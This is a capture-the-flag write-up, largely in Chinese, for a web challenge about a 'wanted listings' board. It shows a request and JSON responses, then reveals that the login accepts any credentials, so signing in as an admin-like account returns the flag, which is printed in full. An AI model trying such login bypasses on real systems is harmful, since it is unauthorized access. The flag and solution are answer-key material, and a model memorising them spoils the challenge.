# The Wanted Listing Trap

## 題目描述

The wanted board lets buyers call for help. Can you turn one request into a response that reveals too much?

## 解題思路

這題蠻神奇的，反正看題目名稱可以知道跟 wanted listings 有關

所以當然是先創一個，標題內容隨便打，之後點 respond 按鈕，點進去沒東西是正常的，但他其實已經幫你發一個 request，並且包含 `I can help with that! Contact me at the number below.`

```js
fetch("http://159.89.230.27/api/wanted-listings/cmqqf251l0000p601ciq59mta/respond", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-Hant;q=0.6,und;q=0.5",
    "content-type": "application/json"
  },
  "referrer": "http://159.89.230.27/listing/respond?listingId=cmqqf251l0000p601ciq59mta",
  "body": "{\"message\":\"I can help with that! Contact me at the number below.\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

會收到回覆，如果 body 裡面多了 `phoneNumber`，則電話號碼那欄就會有東西

```json
{
    "success": true,
    "response": {
        "id": "cmqqffnoc0004p601oa0jm3wu",
        "wantedListingId": "cmqqf251l0000p601ciq59mta",
        "responderId": "1vp1ge",
        "message": "I can help with that! Contact me at the number below.",
        "phoneNumber": null,
        "createdAt": "2026-06-23T09:13:16.189Z"
    }
}
```

好以上的東西你不管試幾次都不會有 flag，這題也沒有什麼 admin bot 去給你 xss，神奇的地方就是可以發現在登入頁面當中輸入隨便的帳號密碼其實都是可以登入的

所以就用 `admin@a` 這個帳號密碼隨便然後就登入了，重複上述動作以後你就會在 `phoneNumber` 裡面看到 flag 了

```json
{
    "success": true,
    "response": {
        "id": "cmqqffnoc0004p601oa0jm3wu",
        "wantedListingId": "cmqqf251l0000p601ciq59mta",
        "responderId": "1vp1ge",
        "message": "I can help with that! Contact me at the number below.",
        "phoneNumber": "bitflag{csrf_1s_4_sl33py_thr34t}",
        "createdAt": "2026-06-23T09:13:16.189Z"
    }
}
```

## Flag

```text
bitflag{csrf_1s_4_sl33py_thr34t}
```
